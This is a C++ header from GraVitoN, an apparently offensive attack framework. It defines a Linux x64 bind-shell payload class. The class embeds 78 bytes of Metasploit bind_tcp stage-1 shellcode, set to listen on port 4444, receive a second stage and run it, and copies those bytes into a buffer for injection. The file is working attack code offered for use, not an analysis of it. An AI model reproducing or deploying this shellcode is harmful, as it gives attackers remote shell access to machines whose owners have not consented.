/**
 * @file
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 *
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief Linux_MSF_Shell_Bind_64
 * 
*/

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
#ifndef _GVN_Linux_MSF_Shell_Bind_64_HEAD_
#define _GVN_Linux_MSF_Shell_Bind_64_HEAD_

#include <payload/payload.hpp>

#include <cstdio>
#include <cstdlib>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <unistd.h>

namespace GraVitoN
{

namespace Payload
{
//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
/**
 * @brief A bind shell for linux x64
 *
 */
class Linux_MSF_Shell_Bind_64 : public Binary_Payload
{
private:
    unsigned int port;

protected:
    virtual bool initPayload();

public:
	/// Constructor
    Linux_MSF_Shell_Bind_64();

	/// Destructor
    virtual ~Linux_MSF_Shell_Bind_64();

	/**
	 * @brief Initialize
	 *
     * @param [in] bport
     * Listening Port
	 * 
	 */
    virtual bool initialize ( const unsigned int &bport );
};

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Linux_MSF_Shell_Bind_64::Linux_MSF_Shell_Bind_64()
{
    jumper = _null_;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Linux_MSF_Shell_Bind_64::~Linux_MSF_Shell_Bind_64()
{
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Linux_MSF_Shell_Bind_64::initPayload()
{
    /*
     * linux/x64/shell/bind_tcp - 78 bytes (stage 1)
     * http://www.metasploit.com
     * VERBOSE=false, LPORT=4444, RHOST=,
     * EnableStageEncoding=false, PrependSetresuid=false,
     * PrependSetreuid=false, PrependSetuid=false,
     * PrependSetresgid=false, PrependSetregid=false,
     * PrependSetgid=false, PrependChrootBreak=false,
     * AppendExit=false, InitialAutoRunScript=, AutoRunScript=
     */
    unsigned char buf[] =
    "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
    "\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31"
    "\x58\x0f\x05\x59\x6a\x32\x58\x0f\x05\x48\x96\x6a\x2b\x58\x0f"
    "\x05\x50\x56\x5f\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31"
    "\xc9\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x96\x48\x97\x5f\x0f"
    "\x05\xff\xe6";

	/// Change port number
//	unsigned char up = port / 256, down = port % 256;
    //buf[20] = up;
    //buf[21] = down;
	int buf_len = 78;

    payload_size = buf_len;
    payload = new unsigned char[payload_size];
    memcpy ( payload, buf, payload_size * sizeof ( unsigned char ) );

    return true;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Linux_MSF_Shell_Bind_64::initialize (const unsigned int &bport)
{
    port = bport;

    Core::Logger::logIt ( "init payload... " );
    initPayload();
    Core::Logger::logItLn ( "done" );

    return true;
}

}
}
#endif // _GVN_Linux_MSF_Shell_Bind_64_HEAD_
